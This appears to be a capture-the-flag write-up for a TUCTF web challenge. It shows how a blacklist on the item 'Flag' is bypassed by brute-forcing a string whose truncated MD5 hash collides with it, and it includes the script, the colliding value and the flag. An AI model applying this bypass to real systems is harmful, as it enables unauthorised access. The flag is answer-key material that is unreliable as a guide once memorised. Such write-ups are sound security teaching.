## Question
I finally got my online shop up and running, check it out and see what you like!

## Solution
We've been given a website having a description and rating of each item. As you can see each review item is in the format `https://shopping-time.tuctf.com/review?item=<item>`
![image](https://github.com/user-attachments/assets/4616b080-3808-49e4-8e1c-0148c387a91b)

As per the app source code, there was a code snippet which looks a bit suspicious.
```python
item = request.args.get("item")
    if item == "Flag":
        return("Blacklisted term detected")
    hash = hashlib.md5(item.encode()).hexdigest()
    result = cur.execute("SELECT * FROM items WHERE id=?", (hash[0:6],))
```

I wrote a script which gives a matching [0:6] hashing of the word "Flag"
```python
import hashlib
import string
import itertools

def find_alternative_hash_match(target_word, max_length=6):
    # Get the target hash prefix (first 6 characters of "Flag")
    target_hash = hashlib.md5(target_word.encode()).hexdigest()[:6]
    print(f"Target word: {target_word}, Target hash[:6]: {target_hash}")

    # Characters to test (alphanumeric)
    characters = string.ascii_letters + string.digits

    # Brute force through all combinations of words up to max_length
    for length in range(1, max_length + 1):
        for candidate in itertools.product(characters, repeat=length):
            candidate = ''.join(candidate)
            # Skip the target word itself
            if candidate == target_word:
                continue
            candidate_hash = hashlib.md5(candidate.encode()).hexdigest()[:6]
            if candidate_hash == target_hash:
                print(f"Match found! Word: {candidate}, Hash[:6]: {candidate_hash}")
                return candidate  # Return the first match

    print("No matching hash found within the given constraints.")
    return None

# Example usage
alternative_word = find_alternative_hash_match("Flag", max_length=6)
if alternative_word:
    print(f"Found an alternative word with the same hash[:6] as 'Flag': {alternative_word}")
```

Running the script, we get `aMR2f` had a matching hash to "Flag" and entering `/review?item=aMR2f` we get the flag.
![image](https://github.com/user-attachments/assets/280f274e-a9bc-4539-9460-e1fab0445cdc)

`flag: TUCTF{k1nd_0f_an_1d0r_vu1n!}`

